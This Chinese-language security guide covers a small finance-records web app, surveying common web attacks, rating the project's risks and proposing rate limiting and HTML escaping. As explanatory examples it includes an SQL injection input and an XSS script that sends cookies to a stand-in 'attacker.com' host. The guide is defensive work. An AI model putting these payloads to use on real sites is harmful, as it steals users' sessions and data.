# Web 应用安全指南

本文档介绍常见的 Web 攻击方式及针对本项目的安全威胁分析。

---

## 一、常见 Web 攻击方式

### 1. SQL 注入 (SQL Injection)

**攻击方式：**
通过在用户输入中注入恶意 SQL 语句，获取数据库数据或执行非法操作。

**示例：**
```sql
-- 用户输入用户名: admin' --
SELECT * FROM users WHERE username = 'admin' --';
```

**针对本项目：**
- 理财记录查询接口可能被注入
- 攻击者可能获取所有用户的理财记录

**防护：**
- ✅ 使用 SQLAlchemy ORM（已采用）
- ❌ 禁止拼接 SQL 字符串

---

### 2. XSS 跨站脚本 (Cross-Site Scripting)

**攻击方式：**
在页面注入恶意 JavaScript 脚本，窃取用户 Cookie 或会话。

**示例：**
```html
<script>document.location='http://attacker.com?cookie='+document.cookie</script>
```

**针对本项目：**
- 指数名称字段可能被注入脚本
- 攻击其他查看页面的用户

**防护：**
- ✅ 后端返回数据时进行 HTML 转义
- ✅ 前端使用 textContent 而非 innerHTML

---

### 3. CSRF 跨站请求伪造

**攻击方式：**
诱导用户访问恶意页面，自动发送已登录的请求。

**针对本项目：**
- 伪造请求删除理财记录
- 伪造请求修改数据

**防护：**
- 使用 SameSite Cookie
- 添加 CSRF Token

---

### 4. DDoS 攻击 (分布式拒绝服务)

**攻击方式：**
大量请求耗尽服务器资源，导致服务不可用。

**针对本项目：**
- 频繁调用 `/api/indices` 接口
- 每次抓取 10 个指数，间隔 1 秒
- 攻击成本低，效果明显

**防护：**
- 请求频率限制
- IP 限流
- CDN 防护

---

### 5. 暴力破解

**攻击方式：**
尝试大量用户名密码组合登录系统。

**针对本项目：**
- 本项目暂无用户系统，风险较低

---

### 6. 信息泄露

**攻击方式：**
通过错误信息、调试信息获取系统细节。

**针对本项目：**
- Python 异常堆栈泄露
- 接口返回详细错误信息

**防护：**
- 生产环境关闭调试模式
- 返回友好错误信息

---

### 7. 文件上传漏洞

**攻击方式：**
上传恶意文件（如 webshell）获取服务器权限。

**针对本项目：**
- ❌ 未使用文件上传功能，风险较低

---

## 二、本项目特定威胁

### 高风险

| 威胁 | 描述 | 防护等级 |
|------|------|----------|
| DDoS 攻击 | 频繁调用指数接口，阻塞服务 | ⚠️ 需防护 |
| 敏感数据泄露 | 数据库未加密，敏感信息暴露 | ⚠️ 需防护 |

### 中风险

| 威胁 | 描述 | 防护等级 |
|------|------|----------|
| SQL 注入 | 虽用 ORM，仍需注意 | ✅ 已防护 |
| XSS | 用户输入未过滤显示 | ⚠️ 需处理 |

### 低风险

| 威胁 | 描述 | 防护等级 |
|------|------|----------|
| CSRF | 无状态接口，风险较低 | ✅ 基本安全 |
| 暴力破解 | 无登录系统 | ✅ 安全 |

---

## 三、当前安全措施

### ✅ 已有的安全实践

1. **SQL 注入防护**
   - 使用 SQLAlchemy ORM
   - 参数化查询

2. **错误处理**
   - 捕获异常，返回友好信息

3. **API 设计**
   - 无状态接口，无需登录

### ❌ 缺失的安全措施

1. **请求频率限制**
   - `/api/indices` 接口可被频繁调用

2. **输入过滤**
   - 指数名称等字段未做 XSS 过滤

3. **敏感数据**
   - 数据库文件直接存储，无加密

4. **生产环境**
   - 调试模式可能未关闭

---

## 四、建议的防护措施

### 1. 紧急 - 防止 DDoS

```python
# 简单频率限制示例
from fastapi import Request
from collections import defaultdict
import time

# IP 访问记录
ip_visits = defaultdict(list)

@app.middleware("http")
async def rate_limit(request: Request, call_next):
    ip = request.client.host
    now = time.time()
    
    # 清除 1 分钟前的记录
    ip_visits[ip] = [t for t in ip_visits[ip] if now - t < 60]
    
    # 超过 30 次/分钟则拒绝
    if len(ip_visits[ip]) > 30:
        return JSONResponse({"error": "请求过于频繁"}, status_code=429)
    
    ip_visits[ip].append(now)
    return await call_next(request)
```

### 2. 重要 - XSS 防护

```python
# 返回数据时转义 HTML 特殊字符
import html

def escape_html(text):
    return html.escape(str(text))
```

### 3. 生产环境配置

```python
# 关闭调试模式
uvicorn.run(app, host="0.0.0.0", port=8081, reload=False)
```

---

## 五、安全检查清单

- [ ] 添加请求频率限制
- [ ] 输入数据进行 HTML 转义
- [ ] 生产环境关闭调试模式
- [ ] 添加请求日志记录
- [ ] 定期更新依赖包
- [ ] 数据库加密存储敏感数据

---

## 六、总结

| 风险等级 | 威胁 | 建议 |
|----------|------|------|
| ⚠️ 高 | DDoS 攻击 | 添加频率限制 |
| ⚠️ 高 | 信息泄露 | 生产环境安全配置 |
| ⚠️ 中 | XSS | 输入转义 |
| ✅ 低 | SQL 注入 | 已防护 |

**当前项目风险评估：中等**

由于项目较小且无敏感数据，主要关注 DDoS 防护和生产环境安全配置。

---

*文档创建时间: 2026-03-12*
